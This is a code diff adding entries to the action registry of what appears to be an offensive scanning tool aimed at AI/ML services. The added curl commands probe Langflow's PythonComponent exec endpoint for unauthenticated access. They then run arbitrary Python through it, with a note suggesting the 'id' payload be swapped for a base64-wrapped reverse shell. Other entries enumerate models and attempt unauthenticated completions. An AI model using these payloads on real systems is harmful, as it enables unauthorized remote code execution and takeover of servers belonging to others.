@@ -85,6 +85,24 @@ ACTION_REGISTRY: dict[str, Action] = {
         outputs="http"),
     "enumerate_models": _a("enumerate_models",
         ["curl -sk $URL/v1/models"], outputs="http"),
+    "probe_langflow_exec": _a("probe_langflow_exec",
+        ["p=/api/v1/langflow/components/exec; "
+         "code=$(curl -sk -o /dev/null -w '%{http_code}' -X POST $URL$p "
+         "-H 'Content-Type: application/json' "
+         "-d '{\"component\":\"PythonComponent\",\"code\":\"1\"}'); "
+         "[ \"$code\" != 404 ] && [ \"$code\" != 401 ] && [ \"$code\" != 403 ] "
+         "&& echo \"FOUND $p -> $code (unauth PythonComponent exec)\""],
+        outputs="raw",
+        note="Langflow forks often leave PythonComponent exec un-gated while the rest of the "
+             "platform is auth-gated. A non-4xx here is unauth RCE."),
+    "langflow_component_exec_rce": _a("langflow_component_exec_rce",
+        ["curl -sk -X POST $URL/api/v1/langflow/components/exec "
+         "-H 'Content-Type: application/json' "
+         "-d '{\"component\":\"PythonComponent\",\"code\":\"import subprocess;"
+         "result=subprocess.run([\\\"id\\\"],capture_output=True,text=True).stdout\"}'"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Unauth RCE: the PythonComponent `code` field runs unsandboxed; `result` is echoed "
+             "in the response. Swap `id` for a base64-wrapped reverse shell (mlrce.sh pattern)."),
     "attempt_completion_unauth": _a("attempt_completion_unauth",
         ["curl -sk -X POST $URL/v1/chat/completions -H 'Content-Type: application/json' "
          "-d '{\"model\":\"gpt-3.5-turbo\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}'"],
